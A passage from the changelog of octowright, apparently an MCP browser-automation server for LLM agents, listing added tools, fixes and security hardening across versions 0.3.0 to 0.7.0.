- **`octowright restart` binds immediately** instead of waiting out the old
  socket's TIME_WAIT — the daemon and the restart pre-flight both set
  `SO_REUSEADDR` / `SO_REUSEPORT` (restart dropped from ~12s to ~2s).
- **A failed initial navigation no longer tears down the browser** (see
  `nav_warning`).
- **Programmatic `window.open` popups are no longer hijacked** by the new-tab
  redirect — only opener-less (user-opened) tabs are redirected.
- New-tab status-strip browser-count off-by-one.

### Removed
- **`browser_click_by`, `browser_fill_by`** — merged into `browser_click` /
  `browser_fill`.
- **`browser_navigate_each`, `browser_resize_each`, `browser_evaluate_each`,
  `browser_wait_for_each`, `browser_screenshot_each`** — merged into
  `browser_each`.

[0.7.0]: https://github.com/livingstaccato/octowright/compare/v0.6.4...v0.7.0

## [0.6.4] - 2026-06-04

### Added
- **`browser_set_protected`** MCP tool — set or clear the protected flag on a
  live browser session after launch, without closing and relaunching.
- **`pool.protected_browsers`** count in `octowright_status()["pool"]` — LLMs
  can now see how many sessions are off-limits at a glance.
- **`browser_spawn_roster`** description updated to mention `protected` field
  in each spec dict; also added to the `core` capability profile.

[0.6.4]: https://github.com/livingstaccato/octowright/compare/v0.6.3...v0.6.4

## [0.6.3] - 2026-06-04

### Added
- **Protected browser flag** — `browser_launch(protected=True)` marks a session
  as user-owned. `browser_close` and `browser_close_all` refuse to close
  protected browsers unless `force=True` is passed, preventing other agents
  from accidentally closing a window the user is actively watching.
  `OCTOWRIGHT_PROTECT_BROWSERS=1` makes every browser protected by default.
- `protected` field surfaced in `browser_list`, `GET /api/sessions` live array,
  and POST `/api/sessions` launch response — LLMs and the dashboard can now
  see which sessions are off-limits.
- Dashboard session table shows a 🔒 badge and a subtle tint on protected rows.
- Skill docs updated: `SKILL.md` and `reference/launch-and-personas.md` now
  direct agents to pass `protected=True` on every user-facing launch.

[0.6.3]: https://github.com/livingstaccato/octowright/compare/v0.6.2...v0.6.3

## [0.6.2] - 2026-05-29

### Fixed
- **Follower bridge recovery when the singleton leader is killed or disappears**
  now unwinds the local stdio follower so `octowright serve` can spawn a fresh
  daemon instead of leaving the client stuck behind a dead HTTP-MCP stream.
- **Bridge request timeouts recycle the remote HTTP-MCP session** so later MCP
  calls reconnect cleanly to the current lockfile leader.
- **`octowright skill install octowright` defaults to the Claude skill +
  Claude plugin target** instead of installing the MCP server target by
  mistake.

[0.6.2]: https://github.com/livingstaccato/octowright/compare/v0.6.1...v0.6.2

## [0.6.1] - 2026-05-27

### Fixed
- **`octowright` with no subcommand now shows help** instead of silently
  starting the daemon. Users on a new machine who run `octowright` without
  arguments see the command listing and usage, not a running MCP server.
- **Python 3.13 `RuntimeError: Attempted to exit cancel scope in a different task`**
  — the follower bridge's `proxy_supervisor` was manually calling
  `streamablehttp_client.__aenter__()` / `.__aexit__()`. Python 3.13 changed
  async generator finalization to run cleanup in a separate asyncio task;
  anyio cancel scopes cannot span task boundaries, producing a noisy traceback
  on every follower teardown. Fixed by switching to
  `async with streamablehttp_client(...)` with a `CancelScope` + `deadline = math.inf`
  trick that preserves the connect-only timeout without constraining the read
  loop.

[0.6.1]: https://github.com/livingstaccato/octowright/compare/v0.6.0...v0.6.1

## [0.6.0] - 2026-05-27

### Added

#### Macro artifact workbench — phases 2 and 3
- **Verification layer** (`macro_artifact_verify`): evaluates critical-point
  checks against a completed artifact run; check types include `result_status`,
  `evidence_exists`, `screenshot_exists`, `assertion_passed`, and `log_contains`.
- `macro_artifact_critical_points_get` / `macro_artifact_critical_points_set`
  MCP tools for reading and overwriting a run's critical-point definitions.
- `macro_artifact_status` MCP tool — summary view of a run including verification
  state, evidence count, and per-check results.
- `verification.json` written into the run bundle alongside `summary.md` when
  verification is run; `## Verification and Critical Points` rendered in
  `summary.md`.
- Telemetry: `octowright.macro.artifact.run` span + `octowright_macro_artifact_run_total`
  counter; `octowright.macro.artifact.verify` span + counter.

#### Export engine (phase 2)
- Expanded JSONL-to-script export fidelity: action parity for all recorded
  browser actions, deduplication, and idiomatic output formatting.
- Full export test suite (`tests/test_export.py`).

#### Agent skill — restructured
- Renamed skill from `using-octowright` → `octowright` (`/octowright:octowright`
  slash command).
- Root `SKILL.md` trimmed to overview + rule summaries + quick reference; deep
  content moved to dedicated reference files.
- New reference files: `launch-and-personas.md`, `macros-and-advisor.md`,
  `debugging.md`, `transport-recovery.md`.
- New command files: `commands/record.md`, `commands/replay.md`,
  `commands/scenario.md`.

### Fixed
- CI smoke script updated to use new `octowright` skill name (was `using-octowright`).

[0.6.0]: https://github.com/livingstaccato/octowright/compare/v0.5.0...v0.6.0

## [0.5.0] - 2026-05-26

465 commits since `v0.3.0`. Highlights below; see `git log v0.3.0..v0.5.0` for
the full record.

### Added

#### Macro artifacts subsystem
- Safe artifact path store anchored under `RECORDINGS_DIR` (path containment,
  symlink resolution before prefix check).
- Artifact planning (`macro_artifact_plan`) and bounded digest tools.
- Artifact run execution with evidence and run report generation.
- Export macros as import-safe standalone CLI scripts.
- Shared report redaction: bearer tokens, cookies (all variants), private key
  fields, common auth key variants, colon-style log previews, summary URLs
  (IPv6-safe; rejects protocol-relative and userinfo-like URLs).

#### OpenTelemetry integration
- Tracing and metrics via `provide.telemetry` — noop by default; enabled with
  `PROVIDE_TRACE_ENABLED=true` / `PROVIDE_METRICS_ENABLED=true`.
- W3C `traceparent` propagation from follower→leader: `httpx` request hook
  injects the header; leader-side ASGI middleware extracts it so tool-handler
  spans chain under the follower's `bridge.forward_rpc` span.
- `octowright.mcp.request` span in the leader-side extraction middleware (ends
  on `http.response.start` to avoid buffering long-lived SSE streams).
- WS-cache batched flush — single flush per drain instead of flush-per-frame.

#### Antigravity (agy) plugin integration
- First-class `agy` plugin support: ships `mcp_config` in the skill pack,
  tracks all plugin manifests, version-guards the plugin list.
- `octowright skill` installs and inspects the skill for both Claude Code and
  Antigravity clients.

#### MCP push notifications
- `notifications/octowright/session_closed` pushed on every session eviction
  (external close and `pool.close`).

#### MCP follower bridge reliability
- Supervised bridge that keeps the local stdio follower alive while the remote
  HTTP-MCP leader session is disposable: in-flight request deadlines, explicit
  JSON-RPC bridge errors on stream loss, automatic reconnect to the current
  lockfile leader URL on the next call.
- Bridge diagnostics surfaced through `octowright_status().bridge` and persisted
  via `OCTOWRIGHT_BRIDGE_STATE`.
- `scripts/bridge_reconnect_smoke.py` to distinguish a broken client handle
  from a broken daemon when transport errors recur.

#### Scenarios + personas subsystem
- `Scenario` / `Participant` dataclasses with YAML and Python loaders.
- `ScenarioPool` with `start` / `stop` / `run_macro` and fixture application.
- Scenario templates, `scenario_plan` dry-run resolver, `scenario_wait_for_sync`
  orchestration, cursor-based tail for live event streaming.
- `Persona` dataclass with YAML loader and credential resolver
  (`*_env` / `*_cmd` references), `persona_credentials_check` pre-flight tool.
- Idempotent migration from the legacy persona layout.
- `octowright scenario` and `octowright persona` CLI subcommand groups.

#### Browser pool capabilities
- Tools: `browser_brief`, `browser_quick_launch`, `browser_suggest_for_url`,
  `browser_read_markdown`, `browser_open_url`, `browser_tail_recording`,
  `browser_*_each` fan-out variants, hover, select_option, drag,
  navigate_back, resize, network_requests, network mocking, dialog policies,
  file uploads, iframe switching, role-based selectors.
- `wait_for_function` JS-expression predicates for `browser_wait_for`.
- `response_mode='brief'` on `browser_click` and `browser_navigate` to keep
  LLM responses compact.
- `session=True` tmpdir profile mode and `profile_cleanup` MCP tool.
- Visual differentiation: persona-stable corner badge with 4-corner positioning,
  per-persona/engine emoji prefix, chromium window tiling, macro status pill
  (with slowmo and run-history modal), viewport status pill.
- Capture cache with semantic capture surfaces (`capture_create`,
  `capture_search`, `capture_list`, `capture_get`, `capture_cleanup`).
- Golden snapshot tooling, `golden_verify_loop`, video recording + frame
  extraction, composite-label pills, Playwright tracing.

#### HTTP dashboard + frontend SPA
- TypeScript debugger SPA in `packages/octowright-frontend/` (npm workspace,
  tsc + biome + vitest), bundled into the wheel and sdist.
- Session-detail page with embedded video, action timeline, console messages,
  downloads, screenshots panels.
- Write endpoints: launch / close / navigate sessions, scenario start / stop /
  run_macro, recording delete, persona YAML editor, disk-size summaries.
- Live screenshot polling and externally-closed browser eviction.
- Dashboard event stream over SSE; WebSocket `/tail` with bounded heartbeat.

#### Capability profiles + Advisor
- `OCTOWRIGHT_PROFILE` env var (and `octowright serve --profile=...`) filters
  the LLM-visible MCP tool surface at `@mcp.tool` decoration time.
- Named profiles: `core`, `advanced`, `macros`, `scenarios`, `personas`.
- Always-on meta + Advisor tools regardless of filter
  (`octowright_status`, `octowright_storage_report`, `octowright_dashboard_url`,
  `octowright_check_takeover`, three `octowright_advisor_*` tools).
- Octowright Advisor — local deterministic guidance: bounded tool-usage
  summaries, repeated-workflow observations, `macro_candidate` suggestions,
  preference persistence.

#### Macros
- `macro_lint` static analysis, `macro_repair_preview`, aria-first replay,
  semantic replay with intent-based recovery prompts.
- Conditional action types: `if_selector`, `try`, `try_each`.
- Parameterized macros with assertions, chaining, and auto-capture on failure.
- Action summarization for compact macro descriptions.

#### CLI + distribution
- `octowright init` first-run scaffolding wizard.
- `octowright restart` to recover wedged daemons cleanly (Windows-compatible).
- `octowright cleanup` to prune stale recordings / screenshots / videos / traces.
- `octowright takeover` to detect and disable competing Playwright MCP plugins.
- `octowright test` JSONL-driven test suite runner.
- `octowright skill` to install / inspect the octowright agent skill,
  with skill-pack distribution baked into the wheel.
- `octowright selftest` to list MCP tools without a client.
- `--log-level` flag and watchdog / shutdown visibility on `octowright serve`.

#### Singleton leader/follower
- Lockfile primitive for leader/follower election.
- Daemonized leader that survives parent SIGKILL.
- HTTP staleness probe with follower auto-promote.
- Idle watchdog: auto-quit when the pool sits empty after use
  (`OCTOWRIGHT_IDLE_GRACE`, default 300s; `--keep-alive` to disable).

### Changed

- Scenario YAML loader validates participant shape; unknown roles warn instead
  of raise to support custom role vocabularies without blocking.
- Scenario role vocabulary extended with domain-specific roles:
  `main-site`, `recorder`, `replayer`, `form`, `counter`, `arithmetic`.
- Coverage gate enforced in CI at 83% floor.
- License switched to Apache-2.0 with SPDX headers across all source files.
- All env-var-driven defaults consolidated into `src/octowright/defaults.py`.
- HTTP API contract documented in `docs/architecture/MCP-SHARED-CONTRACT.md`.
- Recording cleanup is silent-swallow only in shutdown / per-line malformed
  input paths; user-action paths log warnings instead.
- `browser_snapshot` default selector changed to `body`.
- Demo bundle layout reorganised: `demo/bundles/` is source of truth (tracked),
  `demo/tutorial-export/` is derived and gitignored (`make export-demos`).
- HAR rotation helper promoted to public `next_har_path`; returns the original
  path when free instead of always producing a `.N` sibling, and the rotation
  loop is bounded.

### Fixed

- Bridge connect-timeout scope, double-response race, replay-id collision.
- WebSocket `/tail` disconnect race + `shutdown_pool` lock.
- `warm_close` re-threading; `browser_screenshot` atomic write.
- Secrets redaction in JSONL export: locator fills and sequence failure args.
- Macro lint schema aligned with IO recording semantics.
- Cross-origin guard now blocks GET requests to side-effect routes
  (`/api/sessions/{id}/screenshot/now`, `/api/sessions/{id}/markdown`) via a
  per-route `side_effect_get` marker; cross-origin policy applied to mounted
  ASGI apps (FastMCP transport).
- Dashboard origin controls hardened; persona endpoints validate slugs and
  verify containment.
- `browser process` cleanup ensured for persistent contexts on session close.
- Recorded `open_url` actions replay without their captured `page_index`
  (which is replay-specific state).
- Composite-label pills use real RGBA alpha instead of magenta chroma-key.
- WebSocket `/tail` heartbeat cadence + clamping of negative `?since` cursors.
- UTF-8 file IO across recorder / macro storage / persona YAML.
- CI: build the frontend SPA before the wheel build in the test matrix; ship
  the SPA in both wheel and sdist (`check_wheel_assets` validates both).
- Tests no longer hardcode `/Users/tim` paths; POSIX-only daemonize test
  skipped on Windows.
- Sdist member normalisation in `check_wheel_assets` no longer silently masks
  malformed entries.

### Security

- **`OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS`** — shell `*_cmd` credential resolution
  is now default-deny; set to `1` to opt in. Previously allowed by default.
- **`OCTOWRIGHT_ALLOW_PY_SCENARIOS`** — `.py` scenario loading is now
  default-deny; set to `1` to opt in. Previously allowed by default.
- **`OCTOWRIGHT_REDACT_INPUTS`** — record-time scrubbing of typed/filled values
  in JSONL: `off` records literals, `passwords` (default) redacts
  `<input type="password">` and SPA custom-password inputs, `all` redacts every
  typed/filled value.
- Lockfile `chmod 0o600` + parent directory `chmod 0o700`.
- Screenshot path-traversal TOCTOU window closed.
- SPA mount guarded by bind-host check.
- Atomic writes for macro JSON and persona YAML (crash-safe, no partial-write
  window).
- Path containment for replay artifacts and reports: all paths resolved and
  checked against `RECORDINGS_DIR` before write; symlinks resolved before the
  prefix check.
- `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD` env var to allow non-loopback access to
  sensitive dashboard / MCP endpoints; loopback bind by default. Documented
  the RCE-equivalent surface implication when combined with a non-loopback
  bind host without an auth gateway.
- `guard_sensitive_http` ASGI wrapper for mounted apps (FastMCP transport)
  that captures the bind host at wrap time so policy is correct under
  Starlette `Mount` nesting.
- Trust-boundary warnings added to the agent-facing docs.

## [0.3.0] - 2026-05-07

Initial PyPI / TestPyPI publication. See `git log v0.3.0` for the commit
history that led to the first published release.

[0.11.0]: https://github.com/livingstaccato/octowright/compare/v0.10.1...main
[0.10.1]: https://github.com/livingstaccato/octowright/compare/v0.10.0...v0.10.1
[0.9.1]: https://github.com/livingstaccato/octowright/compare/v0.9.0...v0.9.1
[0.9.0]: https://github.com/livingstaccato/octowright/compare/v0.8.0...v0.9.0
[0.8.0]: https://github.com/livingstaccato/octowright/compare/v0.7.0...v0.8.0
[0.5.0]: https://github.com/livingstaccato/octowright/compare/v0.3.0...v0.5.0
[0.3.0]: https://github.com/livingstaccato/octowright/releases/tag/v0.3.0
